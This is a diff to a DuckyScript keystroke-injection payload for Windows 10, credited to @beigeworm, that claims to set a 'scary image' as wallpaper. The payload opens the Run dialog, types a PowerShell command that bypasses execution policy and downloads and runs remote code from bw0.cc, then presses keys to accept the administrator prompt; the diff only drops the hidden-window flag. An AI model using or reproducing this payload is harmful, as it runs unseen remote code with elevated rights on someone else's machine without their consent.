@@ -3,14 +3,11 @@ REM Author: @beigeworm
 REM Description: This script changes downlaods a scary image and sets it as a wallpaper.
 REM Target: Windows 10
 
-REM some setup for dukie script
-DEFAULT_DELAY 100
-
-REM open powershell (remove "-W H" to show the window)
+REM open powershell
 DELAY 1000
 GUI r
 DELAY 750
-STRING powershell -Ep Bypass -W H -C iex (irm bw0.cc/wpjmp)
+STRING powershell -Ep Bypass -C iex (irm bw0.cc/wpjmp)
 CTRL-SHIFT ENTER
 DELAY 3000
 ALT y
